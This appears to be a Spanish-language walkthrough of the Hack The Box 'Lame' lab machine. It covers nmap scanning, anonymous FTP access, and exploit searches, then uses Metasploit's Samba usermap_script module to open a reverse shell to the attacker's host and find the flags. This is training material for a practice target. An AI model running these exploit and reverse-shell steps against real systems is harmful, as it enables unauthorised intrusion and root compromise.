Creamos los directorio de trabajo con el nombre de la maquina en nuestro caso Lame

```ruby
mkdir Lame
```

## Reconocimiento de Puertos

Lanzamos un ping para comprobar que tenemos conexión desde nuestra maquina 

```ruby
ping 10.10.10.3
```

Comprobamos la versión del sistema operativo que tenemos si tenemos un ttl de 63 se trata de una maquina Linux.

### Reconocimientos Nmap

Lanzamos la herramienta Nmap para ver los puertos disponibles que se encuentran abiertos,
es un escaneo agresivo ya que estamos en un entorno controlado

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```

La salida la ponemos en un archivo con formato grepeable para poder buscar luego 

Los puertos son los siguientes:

```ruby
PORT      STATE   SERVICE
21/tcp    open    ftp
22/tcp    open    ssh
139/tcp   open    netbios-ssn 
445/tcp   open    microsoft-ds
3632/tcp  open    distccd
```

Realizamos un escaneo mas exhaustivo para comprobar que versión corre en ese puerto

```ruby
nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted
```

```ruby

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-06-24T12:37:57-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m37s, deviation: 2h49m45s, median: 34s
```


## Analizamos los puertos

#### Puerto ssh :
En un principio no voy a tocarlo porque todavía no se ningunas credenciales validas por lo tanto es perder un poco el tiempo

##### Puerto ftp:
Intento conectarme al servicio ftp con el usuario "anonymous" ya que nos ha reportado que existe y es valido 

```ruby
ftp 10.10.10.3
```

Podemos ver que nos reporta que hemos podido acceder con éxito pero comprobando si existe algún archivo y no nos muestra nada.

```ruby
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55067|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 

```

Buscamos exploit relacionados con la version vsftpd 2.3.4 en search exploit  y en google 
encontramos lo siguiente:

```ruby 
searchsploit vsftpd 2.3.4

vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py

vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb
```

```ruby 
searchsploit -m unix/remote/49757.py
```

Tras probar los dos no nos devuelve nada por lo tanto podemos decir que es un  posible "rabbit hole"

#### Puerto 139 y 445 
Al tener la versión de Samba voy a comprobar en searchsploit si tenemos algun tipo de vulnerabilidad

```ruby
searchsploit Samba 3.0.20
```

Encontramos las siguientes vulnerabilidades

``` ruby
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                            | multiple/remote/10095.txt

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb

Samba < 3.0.20 - Remote Heap Overflow                                             | linux/remote/7701.txt

Samba < 3.6.2 (x86) - Denial of Service (PoC)                                     | linux_x86/dos/36741.py

```

vemos que tenemos un rce que esta en mestasploit voy a probar explotarlo con metasploit 

```ruby
msf6 > exploit(multi/samba/usermap_script) > 
```

Configuramos el exploit con nuestros datos
```ruby
msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.6
LHOST => 10.10.14.6
```

Cuando lo configuramos lo ejecutamos con el comando siguiente

```ruby
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Command shell session 1 opened (10.10.14.3:4444 -> 10.10.10.3:56137) at 2023-06-27 02:58:54 -0400
```
como podemos ver hemos entablado una rever shell 

Podemos hacer el tratamiento de la TTY para que quede una terminal mas bonita 

```ruby
script /dev/null -c bash
```

#### Buscamos las flag

Como podemos ver accedemos como usuario root por lo tanto tenemos acceso a todos los ficheros .

Vamos a buscar las flag con el siguiente comando 

```ruby
find / -name "root.txt" -o -name "user.txt"
```
Nos devuelve dos ficheros que existen en el equipo en los siguientes directorios 

```ruby
/home/makis/user.txt
/root/root.txt
```